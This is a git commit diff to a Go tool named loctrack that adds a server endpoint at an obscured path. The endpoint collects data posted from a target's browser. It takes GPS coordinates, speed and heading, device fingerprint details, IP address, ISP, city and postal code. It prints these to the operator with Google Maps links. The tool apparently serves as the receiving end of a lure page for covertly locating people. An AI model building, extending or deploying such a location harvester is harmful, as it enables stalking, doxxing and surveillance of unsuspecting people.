fd7ecd56e39d6558acbc0f81b3126b1b4c79367c
ghost <37106224+cipheras@users.noreply.github.com>
2021-05-04 17:47:03 +0530

    post hndlr

--- loctrack.go
+++ loctrack.go
@@ -254,8 +254,91 @@ Site:
 
 func server(hndlr string) {
 	time.Sleep(1 * time.Second)
-	Cprint(N, "Starting server on port:"+RESET, *port)
 	reflect.ValueOf(handler.Hndl(0)).MethodByName(hndlr).Call(nil)
+	Cprint(N, "Starting server on port:"+RESET, *port)
+	http.HandleFunc("/rxWyhjKl", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method == "POST" {
+			err := r.ParseForm()
+			Try(err, false, "parsing details")
+			if r.FormValue("Flag") == "1" { //Access granted
+				li := "\t Latitude        :    " + r.FormValue("Lat") +
+					"\n\t Longitude       :    " + r.FormValue("Lon") +
+					"\n\t Accuracy        :    " + r.FormValue("Acc") +
+					"\n\t Altitude        :    " + r.FormValue("Alt") +
+					"\n\t Direction       :    " + r.FormValue("Dir") +
+					"\n\t Speed           :    " + r.FormValue("Spd")
+				Cprint(N, "GPS Location Information:") //Location Information
+				fmt.Println(li)
+				fmt.Printf("\n"+CYAN+"["+GREEN+"+"+CYAN+"] %vGoogle Maps: %vhttps://www.google.com/maps/place/%v+%v%v", PURPLE, GREEN, r.FormValue("Lat"), r.FormValue("Lon"), RESET+"\n")
+			} else if r.FormValue("Flag") == "0" { //Access denied
+				Cprint(N, "GPS Location Information:")
+				switch {
+				case r.FormValue("Denied") != "":
+					fmt.Println("\t Denied      :\t" + r.FormValue("Denied"))
+				case r.FormValue("Una") != "":
+					fmt.Println("\t Unavailable      :\t" + r.FormValue("Una"))
+				case r.FormValue("Time") != "":
+					fmt.Println("\t Timeout      :\t" + r.FormValue("Time"))
+				case r.FormValue("Unk") != "":
+					fmt.Println("\t Unknown      :\t" + r.FormValue("Unk"))
+				}
+			} else {
+				// get IP details if IP available by request headers
+				IPAddress := r.Header.Get("X-Real-Ip")
+				if IPAddress == "" {
+					IPAddress = r.Header.Get("X-Forwarded-For")
+				}
+				if IPAddress == "" {
+					IPAddress = r.RemoteAddr
+				}
+
+				// di := "\t External IP     :    " + string() +
+				di := "\t IP              :    " + IPAddress +
+					"\n\t Referer         :    " + r.Referer() +
+					"\n\t Platform        :    " + r.FormValue("Ptf") +
+					"\n\t Browser         :    " + r.FormValue("Brw") +
+					"\n\t CPU Cores       :    " + r.FormValue("Cc") +
+					"\n\t RAM             :    " + r.FormValue("Ram") +
+					"\n\t GPU Vendor      :    " + r.FormValue("Ven") +
+					"\n\t GPU             :    " + r.FormValue("Ren") +
+					"\n\t Resolution      :    " + r.FormValue("Wd") + " X " + r.FormValue("Ht") +
+					"\n\t OS              :    " + r.FormValue("Os") +
+					"\n\t Java Enabled    :    " + r.FormValue("Java")
+				fmt.Println("\n" + RED + "####################################################################" + RESET)
+				Cprint(N, "Device Information:") //Device Information
+				fmt.Println(di)
+
+				// getting IP details from JS
+				time.Sleep(1 * time.Second)
+				Cprint(N, "IP Information:") //IP Information
+				ipResult := make(map[string]interface{})
+				err := json.Unmarshal([]byte(r.FormValue("Ipp")), &ipResult)
+				Try(err, false, "reading ip info")
+
+				fmt.Println("\t External IP      :\t", ipResult["ip"])
+				fmt.Println("\t ISP              :\t", ipResult["isp"])
+				fmt.Println("\t Organisation     :\t", ipResult["org"])
+				fmt.Println("\t Latitude         :\t", ipResult["latitude"])
+				fmt.Println("\t Longitude        :\t", ipResult["longitude"])
+				fmt.Println("\t Postal Code      :\t", ipResult["postal_code"])
+				fmt.Println("\t City             :\t", ipResult["city"])
+				fmt.Println("\t Region           :\t", ipResult["region"])
+				fmt.Println("\t District         :\t", ipResult["district"])
+				fmt.Println("\t Country          :\t", ipResult["country_name"])
+				fmt.Println("\t Continent        :\t", ipResult["continent_name"])
+				fmt.Println("\t Timezone         :\t", ipResult["timezone_name"])
+				fmt.Println("\t Connection Type  :\t", ipResult["connection_type"])
+				fmt.Println("\t ASN Number       :\t", ipResult["asn_number"])
+				fmt.Println("\t ASN Organisation :\t", ipResult["asn_org"])
+				fmt.Println("\t ASN              :\t", ipResult["asn"])
+
+				// for k, v := range ipResult {
+				// 	fmt.Println("\t "+k+"      :\t", v)
+				// }
+				fmt.Printf("\n"+CYAN+"["+GREEN+"+"+CYAN+"] %vGoogle Maps: %vhttps://www.google.com/maps/place/%v+%v%v", PURPLE, GREEN, ipResult["latitude"], ipResult["longitude"], RESET+"\n")
+			}
+		}
+	})
 	time.Sleep(500 * time.Millisecond)
 	Cprint(I, "Press "+GREEN+"Ctrl-C"+BLUE+" to stop the server")
 	if *tls {
